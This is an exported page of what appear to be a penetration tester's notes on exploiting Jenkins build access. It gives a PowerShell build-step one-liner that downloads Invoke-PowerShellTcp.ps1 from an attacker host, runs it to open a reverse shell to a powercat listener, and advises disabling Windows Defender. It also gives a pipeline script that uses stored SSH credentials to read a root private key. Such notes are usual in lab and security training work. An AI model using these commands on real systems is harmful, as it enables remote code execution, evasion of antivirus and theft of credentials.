<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>10-jenkins</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>10-jenkins</h1><br/><p><h2>Ressources</h2></p><p><ul><li><a href="http://www.labofapenetrationtester.com/2015/11/week-of-continuous-intrusion-day-1.html">http://www.labofapenetrationtester.com/2015/11/week-of-continuous-intrusion-day-1.html</a></li></ul></p><p></p><p></p><p><h2>Exploit Build User</h2><ul><li>configure build <ul><li>jenkins : add build step =&gt; execute windows batch command =&gt; save =&gt; build now</li><li>powershell :<ul><li>powercat -l -v -p 1337</li><li>web server on Invoke-PowershellTcp</li></ul></li><li>Build payload<ul><li>powershell.exe -c iex ((New-Object Net.WebClient).DownloadString(&#39;<a href="http://172.16.100.17/Invoke-PowerShellTcp.ps1'));Power">http://172.16.100.17/Invoke-PowerShellTcp.ps1&#39;);Power</a> -Reverse -IPAddress 172.16.100.17 -Port 1337</li></ul></li></ul></li><li> Notes<ul><li> : press enter for powercat to get shell </li><li>u may need to disable windows dedfender </li></ul></li></ul></p><p></p><p></p><p><h2>Other exploit</h2></p><p><ul><li>if there is SSH key intergrated in credentials  </li><li>run pipeline </li><li>read root ssh key </li><li>create a job = pipeline </li><li></li></ul><div class="codebox"><pre>pipeline {<br />    agent any<br />    stages {<br />        stage(&#39;SSH&#39;) {<br />            steps {<br />                script {<br />                    sshagent(credentials: [&#39;1&#39;]) {<br />                        sh &#39;ssh -o StrictHostKeyChecking=no root@10.10.11.10 &quot;cat /root/.ssh/id_rsa&quot;&#39;<br />                    }<br />                }<br />            }<br />        }<br />    }<br />}<br /></pre></div></p><p></p><p></p><p><ul><li>save and build now <ul><li></li></ul></li></ul></p></div>
</body>
</html>
